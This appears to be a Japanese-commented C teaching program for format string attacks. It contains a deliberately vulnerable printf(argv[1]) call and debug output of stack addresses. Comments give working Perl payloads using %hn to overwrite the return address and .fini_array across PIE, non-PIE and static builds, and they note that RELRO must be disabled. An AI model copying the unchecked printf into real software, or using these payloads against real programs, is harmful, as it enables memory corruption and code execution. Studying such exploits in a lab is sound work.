/***** 以下の例は再コンパイルし直すと動作しなくなるので、多少の調節が必要 *****/
/***** フォーマット文字列攻撃を利用したリターンアドレスの書き換え例 *****/
/***** 書き込み先アドレスと%xの文字数指定部分を自由に変化させることで任意のアドレスに任意の値を書き込むことができる *****/

//位置依存コード用
//./target_not_pie $(perl -e 'print "\xec\xcc\xff\xff" . "\xee\xcc\xff\xff" . "%8x." x 188 . "%54148x%187\$hn" . "%9687x%188\$hn"')

//静的リンクされた実行ファイル用
//./target_static  $(perl -e 'print "\xbc\xcc\xff\xff" . "\xbe\xcc\xff\xff" . "%8x." x 194 . "%54096x%193\$hn" . "%9685x%194\$hn" . "aa"')

//位置独立コード用
//./target_pie     $(perl -e 'print "\xfc\xcc\xff\xff" . "\xfe\xcc\xff\xff" . "%8x." x 188 . "%54156x%185\$hn" . "%9679x%186\$hn"')



/***** 以下の例は再コンパイルし直すと動作しなくなるので、多少の調節が必要 *****/
/***** フォーマット文字列攻撃を利用して.fini_arrayを書き換える例 *****/
/***** RELROによって.fini_arrayが書き込み禁止に設定してあるので、静的リンクした実行ファイル以外ではコンパイル時に -Wl,-z,norelro を指定する必要がある *****/

//位置依存コード用
//./target_not_pie $(perl -e 'print "\xe8\x9a\x04\x08" . "\xea\x9a\x04\x08" . "%8x." x 188 . "%54148x%187\$hn" . "%9687x%188\$hn"')

//静的リンクされた実行ファイル用
//./target_static  $(perl -e 'print "\xb0\x86\x0d\x08" . "\xb2\x86\x0d\x08" . "%8x." x 194 . "%54096x%193\$hn" . "%9685x%194\$hn" . "aa"')

//位置独立コード用
//./target_pie     $(perl -e 'print "\xec\x6b\x55\x56" . "\xee\x6b\x55\x56" . "%8x." x 188 . "%54156x%185\$hn" . "%9679x%186\$hn"')



#include<stdio.h>
#include<stdlib.h>

//コンストラクタの場合は優先順位を指定できるけど、デストラクタの場合はなぜか無視される
__attribute__ ((constructor(101))) void func1(void);
__attribute__ ((constructor(102))) void func2(void);
__attribute__ (( destructor(101))) void func1(void);
__attribute__ (( destructor(102))) void func2(void);

void func1(void){
	printf("func1 is called\n");
}

void func2(void){
	printf("func2 is called\n");
}

int main(int argc, char **argv){
	int test_value = 0xcccccccc;

	if(argc != 2){
		printf("引数として文字列を一つ指定してください\n");
		exit(1);
	}

	printf("特定のメモリを書き換える前に以下のデバッグ変数で調整しておくといいでしょう\n");
	printf("&test_value = %p, test_value = %08x\n", &test_value, test_value);
	printf("リターンアドレスが保存されているアドレス = %p, リターンアドレスの値 = 0x%08x\n", &argc - 1, *((unsigned int*) (&argc - 1)));

	printf("引数の文字列は以下のようになります\n");
	printf(argv[1]);
	printf("\n");

	printf("デバッグ変数は次のように書き換わりました\n");
	printf("&test_value = %p, test_value = %08x\n", &test_value, test_value);
	printf("リターンアドレスが保存されているアドレス = %p, リターンアドレスの値 = 0x%08x\n", &argc - 1, *((unsigned int*) (&argc - 1)));

	return 0;
}
